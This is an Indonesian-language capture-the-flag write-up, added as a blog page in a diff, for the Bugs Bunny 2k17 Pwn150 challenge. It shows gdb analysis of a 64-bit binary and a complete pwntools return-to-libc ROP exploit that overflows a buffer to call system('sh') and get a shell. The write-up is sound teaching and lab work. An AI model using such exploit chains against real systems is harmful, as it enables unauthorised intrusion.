@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Bugs Bunny 2k17 CTF - Pwn150</title>
+  <meta name="description" content="Diberikan file ELF binary bernama pwn150 64-Bit yang harus dibuatkan exploit nya agar bisa mendapatkan flag.">
+  
+  <meta name="author" content="rhama">
+  <meta name="copyright" content="&copy; rhama 2017">
+  
+
+  <!-- External libraries -->
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/monokai-sublime.min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/css/lightbox.css">
+
+  <!-- Favicon and other icons (made with http://www.favicon-generator.org/) -->
+  <link rel="shortcut icon" href="/assets/icons/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon">
+  <link rel="apple-touch-icon" sizes="57x57" href="/assets/icons/apple-icon-57x57.png">
+  <link rel="apple-touch-icon" sizes="60x60" href="/assets/icons/apple-icon-60x60.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="/assets/icons/apple-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/assets/icons/apple-icon-76x76.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="/assets/icons/apple-icon-114x114.png">
+  <link rel="apple-touch-icon" sizes="120x120" href="/assets/icons/apple-icon-120x120.png">
+  <link rel="apple-touch-icon" sizes="144x144" href="/assets/icons/apple-icon-144x144.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="/assets/icons/apple-icon-152x152.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-icon-180x180.png">
+  <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icons/android-icon-192x192.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="96x96" href="/assets/icons/favicon-96x96.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16x16.png">
+  <link rel="manifest" href="/assets/icons/manifest.json">
+  <meta name="msapplication-TileColor" content="#ffffff">
+  <meta name="msapplication-TileImage" content="/assets/icons/ms-icon-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  
+  <!-- Facebook OGP cards -->
+  <meta property="og:description" content="Diberikan file ELF binary bernama pwn150 64-Bit yang harus dibuatkan exploit nya agar bisa mendapatkan flag." />
+  <meta property="og:url" content="https://rhama.my.id" />
+  <meta property="og:site_name" content="CTF.Ninja" />
+  <meta property="og:title" content="Bugs Bunny 2k17 CTF - Pwn150" />
+  <meta property="og:type" content="website" />
+  <meta property="og:image" content="https://rhama.my.id/assets/images/ctf.png" />
+  <meta property="og:image:type" content="image/png" />
+  <meta property="og:image:width" content="612" />
+  <meta property="og:image:height" content="605" />
+  
+
+  
+  <!-- Twitter: card tags -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Bugs Bunny 2k17 CTF - Pwn150">
+  <meta name="twitter:description" content="Diberikan file ELF binary bernama pwn150 64-Bit yang harus dibuatkan exploit nya agar bisa mendapatkan flag.">
+  <meta name="twitter:image" content="https://rhama.my.id/assets/images/ctf.png">
+  <meta name="twitter:url" content="https://rhama.my.id">
+  
+
+  
+
+  <!-- Site styles -->
+  <link rel="stylesheet" href="/css/main.css">
+   <link rel="stylesheet" href="/css/terminal.css">
+  <link rel="canonical" href="https://rhama.my.id/ctf/2017/07/22/bugs-bunny2k17-pwn150.html">
+  <link rel="alternate" type="application/rss+xml" title="CTF.Ninja" href="https://rhama.my.id/feed.xml" />
+</head>
+
+
+  <body>
+
+    <header class="navigation" role="banner">
+  <div class="navigation-wrapper">
+    <a href="/" class="logo">
+      
+      <img src="/assets/logo.png" alt="CTF.Ninja">
+      
+    </a>
+    <a href="javascript:void(0)" class="navigation-menu-button" id="js-mobile-menu">
+      <i class="fa fa-bars"></i>
+    </a>
+    <nav role="navigation">
+      <ul id="js-navigation-menu" class="navigation-menu show">
+        
+          
+          <li class="nav-link"><a href="/about/">About</a>
+          
+        
+          
+          <li class="nav-link"><a href="/posts/">Archives</a>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+        <div class="post">
+
+<div class="post-header-container has-cover" style="background-image: url(/assets/images/ctf.png);">
+  <div class="scrim has-cover">
+    <header class="post-header">
+      <h1 class="title">Bugs Bunny 2k17 CTF - Pwn150</h1>
+      <p class="info">by <strong>Aiden Pearce</strong></p>
+    </header>
+  </div>
+</div>
+
+<div class="wrapper">
+
+
+
+<section class="post-meta">
+  <div class="post-date">July 22, 2017</div>
+  <div class="post-categories">
+  in 
+    
+    <a href="/category/CTF">Ctf</a>
+    
+  
+  </div>
+</section>
+
+<article class="post-content">
+  <p>Diberikan file ELF binary bernama <code class="highlighter-rouge">pwn150</code> 64-Bit yang harus dibuatkan exploit nya agar bisa mendapatkan flag.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">➜  file pwn150
+pwn150: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 2.6.32, BuildID[sha1]<span class="o">=</span>dc1ada44067255e5211fafc5133679404b54f110, not stripped</code></pre></figure>
+
+<p>Elf binary tersebut diproteksi NX (No-eXecute)</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">gdb-peda$ </span>checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial</code></pre></figure>
+
+<p>Karena NX enabled, saya berasumsi untuk mengeksploitnya menggunakan teknik <code class="highlighter-rouge">Return-to-libc</code>.</p>
+
+<p>Menggunakan <code class="highlighter-rouge">gdb</code> diketahui terdapat 3 user defined function yaitu <code class="highlighter-rouge">main</code>, <code class="highlighter-rouge">today</code> dan <code class="highlighter-rouge">Hello</code>.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">gdb-peda$ </span>info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000400598  _init
+0x00000000004005d0  puts@plt
+0x00000000004005e0  system@plt
+0x00000000004005f0  <span class="nb">printf</span>@plt
+0x0000000000400600  __libc_start_main@plt
+0x0000000000400610  fgets@plt
+0x0000000000400620  fflush@plt
+0x0000000000400630  fopen@plt
+0x0000000000400640  fwrite@plt
+0x0000000000400660  _start
+0x0000000000400690  deregister_tm_clones
+0x00000000004006d0  register_tm_clones
+0x0000000000400710  __do_global_dtors_aux
+0x0000000000400730  frame_dummy
+0x0000000000400756  today
+0x0000000000400767  Hello
+0x00000000004007f4  main
+0x0000000000400820  __libc_csu_init
+0x0000000000400890  __libc_csu_fini
+0x0000000000400894  _fini</code></pre></figure>
+
+<p>Hasil disassembly fungsi today</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">gdb-peda$ </span>pdisass today
+Dump of assembler code <span class="k">for function </span>today:
+   0x0000000000400756 &lt;+0&gt;:	push   rbp
+   0x0000000000400757 &lt;+1&gt;:	mov    rbp,rsp
+   0x000000000040075a &lt;+4&gt;:	mov    edi,0x4008a8
+   0x000000000040075f &lt;+9&gt;:	call   0x4005e0 &lt;system@plt&gt;
+   0x0000000000400764 &lt;+14&gt;:	nop
+   0x0000000000400765 &lt;+15&gt;:	pop    rbp
+   0x0000000000400766 &lt;+16&gt;:	ret    
+End of assembler dump.</code></pre></figure>
+
+<p>Terdapat pemanggilan fungsi <code class="highlighter-rouge">system</code> dengan argument <code class="highlighter-rouge">/bin/date</code></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">gdb-peda$ </span>x/s 0x4008a8
+0x4008a8:	<span class="s2">"/bin/date"</span></code></pre></figure>
+
+<p>Hasil disassembly fungsi Hello</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">gdb-peda$ </span>pdisass Hello
+Dump of assembler code <span class="k">for function </span>Hello:
+   0x0000000000400767 &lt;+0&gt;:	push   rbp
+   0x0000000000400768 &lt;+1&gt;:	mov    rbp,rsp
+   0x000000000040076b &lt;+4&gt;:	sub    rsp,0x50
+   0x000000000040076f &lt;+8&gt;:	mov    edi,0x4008b8
+   0x0000000000400774 &lt;+13&gt;:	mov    eax,0x0
+   0x0000000000400779 &lt;+18&gt;:	call   0x4005f0 &lt;<span class="nb">printf</span>@plt&gt;
+   0x000000000040077e &lt;+23&gt;:	mov    rax,QWORD PTR <span class="o">[</span>rip+0x2008eb]        <span class="c"># 0x601070 &lt;stdout@@GLIBC_2.2.5&gt;</span>
+   0x0000000000400785 &lt;+30&gt;:	mov    rdi,rax
+   0x0000000000400788 &lt;+33&gt;:	call   0x400620 &lt;fflush@plt&gt;
+   0x000000000040078d &lt;+38&gt;:	mov    rdx,QWORD PTR <span class="o">[</span>rip+0x2008ec]        <span class="c"># 0x601080 &lt;stdin@@GLIBC_2.2.5&gt;</span>
+   0x0000000000400794 &lt;+45&gt;:	lea    rax,[rbp-0x50]
+   0x0000000000400798 &lt;+49&gt;:	mov    esi,0xc0
+   0x000000000040079d &lt;+54&gt;:	mov    rdi,rax
+   0x00000000004007a0 &lt;+57&gt;:	call   0x400610 &lt;fgets@plt&gt;
+   0x00000000004007a5 &lt;+62&gt;:	mov    esi,0x4008e1
+   0x00000000004007aa &lt;+67&gt;:	mov    edi,0x4008e3
+   0x00000000004007af &lt;+72&gt;:	call   0x400630 &lt;fopen@plt&gt;
+   0x00000000004007b4 &lt;+77&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x8],rax
+   0x00000000004007b8 &lt;+81&gt;:	cmp    QWORD PTR <span class="o">[</span>rbp-0x8],0x0
+   0x00000000004007bd &lt;+86&gt;:	jne    0x4007d0 &lt;Hello+105&gt;
+   0x00000000004007bf &lt;+88&gt;:	mov    edi,0x4008f8
+   0x00000000004007c4 &lt;+93&gt;:	call   0x4005d0 &lt;puts@plt&gt;
+   0x00000000004007c9 &lt;+98&gt;:	mov    eax,0x1
+   0x00000000004007ce &lt;+103&gt;:	jmp    0x4007f2 &lt;Hello+139&gt;
+   0x00000000004007d0 &lt;+105&gt;:	mov    rdx,QWORD PTR <span class="o">[</span>rbp-0x8]
+   0x00000000004007d4 &lt;+109&gt;:	lea    rax,[rbp-0x50]
+   0x00000000004007d8 &lt;+113&gt;:	mov    rcx,rdx
+   0x00000000004007db &lt;+116&gt;:	mov    edx,0x1
+   0x00000000004007e0 &lt;+121&gt;:	mov    esi,0x40
+   0x00000000004007e5 &lt;+126&gt;:	mov    rdi,rax
+   0x00000000004007e8 &lt;+129&gt;:	call   0x400640 &lt;fwrite@plt&gt;
+   0x00000000004007ed &lt;+134&gt;:	mov    eax,0x0
+   0x00000000004007f2 &lt;+139&gt;:	leave  
+   0x00000000004007f3 &lt;+140&gt;:	ret    
+End of assembler dump.</code></pre></figure>
+
+<p>fungsi <code class="highlighter-rouge">fgets</code> digunakan untuk user input sebanyak <code class="highlighter-rouge">0xc0</code> bytes atau 192 bytes dalam desimal.
+Selain itu, fungsi <code class="highlighter-rouge">fopen</code> akan membuka file bernama <code class="highlighter-rouge">bugsbunny.txt</code> dalam mode <code class="highlighter-rouge">a</code> atau <code class="highlighter-rouge">append</code> untuk menyimpan inputan user.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">gdb-peda$ </span>x/s 0x4008e1
+0x4008e1:	<span class="s2">"a"</span>
+<span class="gp">gdb-peda$ </span>x/s 0x4008e3
+0x4008e3:	<span class="s2">"bugsbunny.txt"</span></code></pre></figure>
+
+<p>Setelah itu fungsi <code class="highlighter-rouge">puts</code> akan mengeluarkan output <code class="highlighter-rouge">So shorry cant talk to you now :( </code></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">gdb-peda$ </span>x/s 0x4008f8
+0x4008f8:	<span class="s2">"So shorry cant talk to you now :( "</span></code></pre></figure>
+
+<h3 id="lets-overflow">Let’s OverFlow</h3>
+
+<p>Setelah dilakukan fuzzing, dibutuhkan 88 bytes untuk mengoverwrite register <code class="highlighter-rouge">rip</code>.</p>
+
+<p>percobaan dengan menginput kan 88 bytes huruf “A” + 4 bytes huruf “B” untuk memastikan nya kalau itu benar-benar 88 bytes untuk mengoverwrite <code class="highlighter-rouge">rip</code> nya.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">gdb-peda$ </span>x/x <span class="nv">$rip</span>
+0xa42424242:	Cannot access memory at address 0xa42424242</code></pre></figure>
+
+<p>Terlihat 0x42 adalah huruf ‘B’ dalam ascii.</p>
+
+<p>Karena 64 bit elf binary menyimpan argument nya pada register yang mana masing-masing argument ke 1,2,3 dst (dan saya bingung wkwk) akan disimpan di <code class="highlighter-rouge">rdi, rsi dan rcx</code> .
+saya menggunakan <a href="http://ropshell.com/ropsearch?h=4a33feaf7ac08268b924f4cb8b5cafbe">online rop gadget search</a> untuk mencari gadget <code class="highlighter-rouge">pop rdi; ret</code> yang digunakan untuk memasukan argument ke <code class="highlighter-rouge">rdi</code>.</p>
+
+<p>Didapatkan gadget <code class="highlighter-rouge">pop rdi; ret</code> berada didalamat <code class="highlighter-rouge">0x00400883</code>.</p>
+
+<p>Setelah itu mencari alamat dari fungsi <code class="highlighter-rouge">system</code> didapatkan <code class="highlighter-rouge">0x00000000004005e0</code></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">gdb-peda$ </span>info functions
+All defined functions:
+
+Non-debugging symbols:
+....
+0x00000000004005e0  system@plt
+....</code></pre></figure>
+
+<p>Lalu mencari alamat dari <code class="highlighter-rouge">sh</code></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">gdb-peda$ </span>find <span class="s2">"sh"</span>
+Searching <span class="k">for</span> <span class="s1">'sh'</span> <span class="k">in</span>: None ranges
+Found 100 results, display max 100 items:
+    pwn150 : 0x4003ef --&gt; 0x6e65706f66006873 <span class="o">(</span><span class="s1">'sh'</span><span class="o">)</span></code></pre></figure>
+
+<p>Tujuan kita adalah me spawning shell dengan fungsi <code class="highlighter-rouge">system('sh')</code> karena binary tersebut di proteksi dengan NX jadi tidak bisa menggunakan shellcode.</p>
+
+<p>Sehingga penyusunan payloadnya akan menjadi seperti berikut</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">junk + pop_rdi_ret_addr + sh_addr + system_addr</code></pre></figure>
+
+<p>Atau implementasi menggunakan python.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">junk</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">88</span>
+<span class="n">sh_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4003ef</span><span class="p">)</span>
+<span class="n">pop_rdi_ret_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400883</span><span class="p">)</span> <span class="c"># pop rdi; ret</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004005e0</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi_ret_addr</span> <span class="o">+</span> <span class="n">sh_addr</span> <span class="o">+</span> <span class="n">system_addr</span></code></pre></figure>
+
+<p>Berikut exploit code lengkap nya.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="k">print</span> <span class="n">context</span><span class="o">.</span><span class="n">arch</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"/home/rhama/Downloads/pwn150"</span><span class="p">)</span>
+<span class="n">junk</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">88</span>
+<span class="n">sh_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4003ef</span><span class="p">)</span>
+<span class="n">pop_rdi_ret_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400883</span><span class="p">)</span> <span class="c"># pop rdi; ret</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004005e0</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi_ret_addr</span> <span class="o">+</span> <span class="n">sh_addr</span> <span class="o">+</span> <span class="n">system_addr</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>Setelah code dieksekusi akan mendapat interactive shell.</p>
+
+<!-- mencari gadget
+http://ropshell.com/ropsearch?h=4a33feaf7ac08268b924f4cb8b5cafbe
+
+0x00400883 : pop rdi; ret -->
+
+</article>
+
+
+
+<section class="tags">
+  <strong>Tags:</strong> <a href="/tag/bugs-bunny2k17">bugs-bunny2k17</a>,&nbsp;<a href="/tag/CTF">CTF</a>
+</section>
+
+
+
+<section class="rss">
+  <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
+</section>
+
+<section class="share">
+  <span>Share: </span>
+  
+    
+    
+    
+      <a href="//www.facebook.com/sharer.php?t=Bugs+Bunny+2k17+CTF+-+Pwn150&u=https%3A%2F%2Frhama.my.id%2Fctf%2F2017%2F07%2F22%2Fbugs-bunny2k17-pwn150.html"
+        onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
+        <i class="fa fa-facebook-square fa-lg"></i>
+      </a>
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+      <a href="//www.reddit.com/submit" onclick="window.location = '//www.reddit.com/submit?url=' + encodeURIComponent('https://rhama.my.id/ctf/2017/07/22/bugs-bunny2k17-pwn150.html') + '&title=Bugs Bunny 2k17 CTF - Pwn150'; return false">
+        <i class="fa fa-reddit-square fa-lg"></i>
+      </a>
+    
+    
+  
+    
+    
+    
+    
+    
+    
+    
+    
+  
+</section>
+
+
+
+
+</div>
+</div>
+
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h3 class="footer-heading">CTF.Ninja</h3>
+
+    <div class="site-navigation">
+
+      <p><strong>Site Map</strong></p>
+      <ul class="pages">
+        
+        
+          <li class="nav-link"><a href="/about/">About</a>
+        
+        
+        
+          <li class="nav-link"><a href="/posts/">Archives</a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+      </ul>
+    </div>
+
+    <div class="site-contact">
+
+      <p><strong>Contact</strong></p>
+      <ul class="social-media-list">
+        <li>
+          <a href="mailto:r4m@protonmail.com">
+            <i class="fa fa-envelope-o"></i>
+            <span class="username">r4m@protonmail.com</span>
+          </a>
+        </li>
+
+        
+          
+          <li>
+            <a href="https://www.facebook.com/eat.sleep.pwn.repeat" title="Friend me on Facebook">
+              <i class="fa fa-facebook"></i>
+              <span class="username">eat.sleep.pwn.repeat</span>
+            </a>
+          </li>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+
+      </ul>
+    </div>
+
+    <div class="site-signature">
+      <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
+      <p class="text">CTF, InfoSec, Banana And More.
+</p>
+    </div>
+
+  </div>
+
+</footer>
+
+<!-- Scripts -->
+<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/js/lightbox.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function() {
+  // Default syntax highlighting
+  hljs.initHighlightingOnLoad();
+
+  // Header
+  var menuToggle = $('#js-mobile-menu').unbind();
+  $('#js-navigation-menu').removeClass("show");
+  menuToggle.on('click', function(e) {
+    e.preventDefault();
+    $('#js-navigation-menu').slideToggle(function(){
+      if($('#js-navigation-menu').is(':hidden')) {
+        $('#js-navigation-menu').removeAttr('style');
+      }
+    });
+  });
+});
+
+</script>
+
+
+
+
+
+
+  </body>
+
+</html>
